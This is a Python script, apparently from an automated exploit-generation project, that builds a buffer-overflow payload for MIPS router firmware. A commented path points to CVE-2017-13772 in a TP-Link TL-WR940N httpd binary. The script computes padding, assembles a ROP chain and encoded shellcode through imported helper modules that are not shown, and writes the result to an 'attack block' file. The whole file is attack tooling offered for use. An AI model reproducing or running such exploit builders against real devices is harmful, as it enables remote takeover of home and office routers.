#!/usr/bin/env python

import pwn
from pwn import *
from capstone import *
from capstone.mips import *
from optparse import *

from scanningModule.scanningOffset import *
from generateROP.ROPchain import *
from generateShellCode.Shellcode001 import *

def returnAttackBlock(binaryFilePath,overflowFPO):

#user input

	#Get the Control offset for generate padding
	#OffsetP = GetGeneratePadding("/root/work/vuln-exp-auto/CVE-2017-13772/TL-WR940N(US)_V4_160617_1476690524248q/_wr940nv4_us_3_16_9_up_boot(160617).bin.extracted/squashfs-root/usr/bin/httpd", 0x00478584)
	OffsetP = GetGeneratePadding(binaryFilePath, overflowFPO)
	print "padding size is " + str(OffsetP)
	
	prevoPadding = 'A' * OffsetP
	print "\npadding is " + prevoPadding

	#Get the ROP chain
	RopChain = GetRopChain(binaryFilePath)
	print "\nRop Chain is " + RopChain

	#Get the encode ShellCode 
	ShellCode = GetEncodeShellCode()		
	print "\nShellCode is " + ShellCode

	#wirte to File
	attackBlockF = open("attackBlock.txt","w+")
	attackBlockF.write("attackBlock = \"")
	attackBlockF.write(prevoPadding + RopChain + ShellCode)
	attackBlockF.write("\"")
	attackBlockF.close()
	print "\nattack block generate complete in file"
	
	return 0

def main():
	#handle argument
	parser = OptionParser()
	parser.add_option("-b", "--binaryFile", dest="binaryFile_path", help="input binary file path")
	parser.add_option("-o", "--overflowPoint", dest="overflowFunctionPointOffset", help="input overflow function point offset")

	options, args = parser.parse_args()

	if options.binaryFile_path == None: 
		parser.error("[x] No binary file path specified, input binary file path, such as [sudo python xxx.py -b xxx/xxx]")
		return -1

	if options.overflowFunctionPointOffset == None: 
		parser.error("[x] No overflow function point specified, input overflow function point offset, such as [sudo python xxx.py -o 0xXXXXX]")
		return -1

	binaryFilePath = options.binaryFile_path
	overflowFPO = int(options.overflowFunctionPointOffset,16)
	

	returnAttackBlock(binaryFilePath,overflowFPO)


if __name__ == '__main__':

	main()


